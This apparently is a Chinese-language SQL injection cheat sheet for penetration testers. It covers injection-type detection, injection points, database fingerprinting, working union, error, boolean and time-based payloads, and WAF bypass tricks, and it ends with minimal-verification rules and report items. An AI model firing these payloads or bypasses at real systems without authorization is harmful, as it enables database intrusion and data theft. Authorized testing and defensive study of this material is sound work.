# SQL 注入技巧

## 注入类型识别
- 数字型：`?id=1` 与 `?id=1-0` 结果对比；字符型：`?name='` 报错
- 报错注入：updatexml / extractvalue / floor 报错回显
- 布尔盲注：`1=1` vs `1=2` 响应差异
- 时间盲注：`sleep(5)` 延迟判断
- 堆叠注入：`;select ...`（需支持多语句的驱动，如 MSSQL/PG）

## 注入点定位
- 常规：GET/POST 参数、JSON 参数、Cookie、Referer/UA/X-Forwarded-For 头
- 隐藏点：排序字段（order by）、搜索框（like 模糊查询）、文件上传文件名、分页参数、批量操作接口
- 二次注入：数据入库后再拼接（昵称/评论内容触发）

## 数据库指纹
- MySQL：`version()`、`@@version`、`information_schema`
- MSSQL：`@@version`、`db_name()`、`sysobjects`
- Oracle：`v$version`、`dual`、`rownum`
- PG：`current_database()`、`version()`、`pg_catalog`

## 基础 Payload
- 联合查询：`' union select 1,2,3-- -`（先 order by 猜列数）
- 报错：`' and updatexml(1,concat(0x7e,user()),1)-- -`
- 布尔：`' and ascii(substr(database(),1,1))>100-- -`
- 时间：`' and sleep(5)-- -`

## 绕过与变形（详见 waf-bypass.md）
- 注释符：`-- -`、`#`、`/**/`、`--%20`
- 关键字拆分：`sel/**/ect`、`concat('se','lect')`、大小写混合
- 等价替换：`information_schema` → `mysql.innodb_table_stats` / `sys.schema_table_statistics`、空格 → `%0a`/`%0b`/`%09`/`/**/`

## 最小化验证（铁律）
- 证明可注入即可：布尔对比（1=1 vs 1=2）、时间延迟、报错回显函数名
- 不做：批量拖库、dump 真实用户数据
- 越权/数据类验证用自己注册的测试数据

## 报告要点
- 注入点 URL + 参数 + 完整请求包、数据库类型/版本、可利用深度（是否可读库/读文件）、最小 PoC 与复现步骤
